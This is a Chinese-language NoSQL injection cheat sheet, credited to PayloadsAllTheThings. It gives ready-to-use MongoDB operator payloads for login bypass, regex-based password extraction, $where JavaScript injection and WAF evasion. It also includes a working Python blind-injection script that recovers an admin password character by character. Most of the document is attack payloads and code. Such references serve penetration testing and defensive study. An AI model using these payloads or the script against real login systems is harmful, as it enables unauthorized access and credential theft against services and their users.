# NoSQL Injection - NoSQL注入

[SEARCH_KEYWORDS]
漏洞类型: NoSQL Injection NoSQL注入 MongoDB Injection
数据库: MongoDB CouchDB Redis Cassandra
关键词: $ne $gt $lt $regex $in $nin $where $or $and
攻击类型: Authentication Bypass Data Extraction Blind Injection
技术: Operator Injection JSON Injection Regex Injection

[CONTENT]

## NoSQL注入概述

NoSQL数据库提供比传统SQL数据库更宽松的一致性限制。NoSQL注入是攻击者通过注入恶意输入来操纵NoSQL数据库查询。与SQL注入不同，NoSQL注入通常利用基于JSON的查询和操作符。

## 操作符注入

| 操作符 | 描述 |
|--------|------|
| $ne | 不等于 |
| $gt | 大于 |
| $lt | 小于 |
| $gte | 大于等于 |
| $lte | 小于等于 |
| $regex | 正则表达式 |
| $in | 在数组中 |
| $nin | 不在数组中 |
| $where | JavaScript执行 |

## 认证绕过

### HTTP表单数据

```powershell
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

### JSON数据

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## 数据提取

### 长度检测

```powershell
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 字符枚举

```powershell
# HTTP数据
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

# JSON数据
{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
```

### $in操作符

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root"]},"password":{"$gt":""}}
```

## $where子句注入

MongoDB允许在$where中使用JavaScript：

```javascript
$this.password.match(/^a/)
this.password.match(/^a/)
```

## WAF绕过

### 重复键覆盖

在MongoDB中，如果文档包含重复键，只有最后一个键生效：

```json
{"id":"10", "id":"100"}  // 最终id为100
```

### 编码绕过

```powershell
# Unicode编码
\u0024ne  -> $ne
```

## 盲注脚本

### POST JSON盲注

```python
import requests, string
username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s"}}' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers)
            if 'OK' in r.text:
                password += c
                print(f"Found: {password}")
                break
```

## 工具

- NoSQLMap - NoSQL数据库枚举利用工具
- nosqlilab - NoSQL注入实验室
- Burp-NoSQLiScanner - Burp NoSQL注入扫描插件

## 参考文档

原始来源: PayloadsAllTheThings/NoSQL Injection/README.md